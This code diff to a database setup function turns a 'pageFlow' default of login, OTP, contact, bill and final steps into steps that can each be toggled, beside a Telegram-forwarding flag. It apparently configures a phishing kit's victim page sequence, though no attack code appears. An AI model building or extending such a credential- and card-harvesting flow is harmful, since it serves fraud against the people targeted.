@@ -48,12 +48,12 @@ export async function initDB() {
         TelegramEnabled INTEGER DEFAULT 0 CHECK (TelegramEnabled IN (0,1)),
         baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
         pageFlow TEXT NOT NULL DEFAULT '{
-          "1": "login",
-          "2": "otp",
-          "3": "contact",
-          "4": "bill",
-          "5": "final"
-        }'
+		  "1": { "page": "login", "enabled": true },
+		  "2": { "page": "otp", "enabled": true },
+		  "3": { "page": "contact", "enabled": false },
+		  "4": { "page": "bill", "enabled": true },
+		  "5": { "page": "final", "enabled": true }
+		}'
       );
     `);
 
